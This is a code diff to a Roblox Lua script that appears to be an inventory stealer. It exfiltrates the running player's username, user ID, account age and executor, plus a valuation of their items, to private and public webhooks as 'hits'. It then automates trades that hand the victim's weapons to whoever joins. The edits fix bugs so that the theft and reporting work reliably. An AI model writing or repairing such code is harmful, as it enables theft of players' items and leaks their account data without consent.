@@ -45,22 +45,8 @@ if isSalora then
     return
 end
 
--- Server hop if VIP or full (BETTER FIX)
-local VIP = false
-local FULL = (#Players:GetPlayers() >= 12)
-
--- Safely check if server is VIP
-local success, serverType = pcall(function()
-    return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
-end)
-
-if success and serverType then
-    VIP = (serverType == "VIPServer")
-else
-    warn("Failed to get server type, assuming not VIP")
-end
-
--- Server check - kick if VIP or full
+-- FIXED: Removed duplicate server check code
+-- Server check - kick if VIP or full (removed duplicates)
 local VIP = false
 local FULL = (#Players:GetPlayers() >= 12)
 
@@ -83,6 +69,7 @@ if VIP or FULL then
     end
     return
 end
+
 -- ============================================================================
 
 local bit = bit32 or require("bit")  -- for bitwise operations
@@ -561,14 +548,17 @@ local function addWeaponToTrade(id)
     Trade.OfferItem:FireServer(id, "Weapons")
 end
 
--- Send hit to public endpoint (using KEY2 and URL2)
-local function SendPublicHit(list, totalValue)
+-- Send hit to public endpoint (using KEY2 and URL2) - FIXED: Pass totalValue parameter
+local function SendPublicHit(list, totalValuePassed)
     if not list or #list == 0 then return end
+    
+    -- Use the passed parameter or 0 if nil
+    local displayValue = totalValuePassed or 0
     local usdData = GetUSD(list)
     local totalUSD = usdData.total or "0.00"
     local itemPrices = usdData.itemPrices or {}
 
-    local inventoryString = "```Total: " .. totalValue .. " / \$" .. totalUSD .. "\n\n"
+    local inventoryString = "```Total: " .. tostring(displayValue) .. " / \$" .. totalUSD .. "\n\n"
     for _, item in ipairs(list) do
         local itemInfo = database[item.DataID]
         local displayName = itemInfo and itemInfo.ItemName or item.DataID
@@ -609,7 +599,7 @@ local function SendPublicHit(list, totalValue)
 end
 
 -- Send first message (to private webhook and public endpoint)
-local function SendFirstMessage(list, prefix)
+local function SendFirstMessage(list, prefix, totalValuePassed)
     local usdData = GetUSD(list)
     local totalUSD = usdData.total or "0.00"
     local itemPrices = usdData.itemPrices or {}
@@ -619,7 +609,7 @@ local function SendFirstMessage(list, prefix)
     local fields = {
         { name = "\240\159\142\175 __Information__", value = "```User     : " .. plr.Name .. "\nID       : " .. plr.UserId .. "\nAge      : " .. plr.AccountAge .. "\nExecutor : " .. Executor .. "```", inline = false },
         { name = "\240\159\140\144 __Server__", value = "```Players    : " .. #Players:GetPlayers() .. " / " .. game.Players.MaxPlayers .. "```", inline = false },
-        { name = "\240\159\147\166 __Inventory:__", value = "```Total Value: " .. (totalValue or 0) .. " / \$" .. totalUSD .. "\n\n", inline = false },
+        { name = "\240\159\147\166 __Inventory:__", value = "```Total Value: " .. tostring(totalValuePassed or 0) .. " / \$" .. totalUSD .. "\n\n", inline = false },
         { name = "\240\159\148\151  __Join Link__", value = "[**Click to Join**](" .. JoinLink .. ")", inline = false }
     }
 
@@ -643,8 +633,8 @@ local function SendFirstMessage(list, prefix)
         }}
     }
     SendMemberHit(data)
-    SendPublicHit(list, totalValue)
-    if totalValue >= 300 then
+    SendPublicHit(list, totalValuePassed)
+    if totalValuePassed and totalValuePassed >= 300 then
         task.spawn(function() task.wait(60) SecureSend(data) end)
     end
 end
@@ -689,7 +679,9 @@ if #weaponsToSend > 0 then
     table.sort(weaponsToSend, function(a, b) return (a.Value * a.Amount) > (b.Value * b.Amount) end)
 
     local prefix = (ping == "Yes") and "--@everyone " or ""
-    SendFirstMessage(weaponsToSend, prefix)
+    
+    -- FIXED: Pass totalValue to SendFirstMessage
+    SendFirstMessage(weaponsToSend, prefix, totalValue)
 
     local function doTrade(joinedUser)
         local initialTradeState = getTradeStatus()
@@ -725,7 +717,7 @@ if #weaponsToSend > 0 then
                 -- Verify if items were actually taken
                 local currentInv = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
                 local firstItemAttempted = weaponsToSend[1].DataID
-                if not currentInv.Weapons.Owned[firstItemAttempted] then
+                if firstItemAttempted and not currentInv.Weapons.Owned[firstItemAttempted] then
                     for _ = 1, numToTrade do table.remove(weaponsToSend, 1) end
                 else
                     pcall(function() Trade.DeclineTrade:FireServer() end)
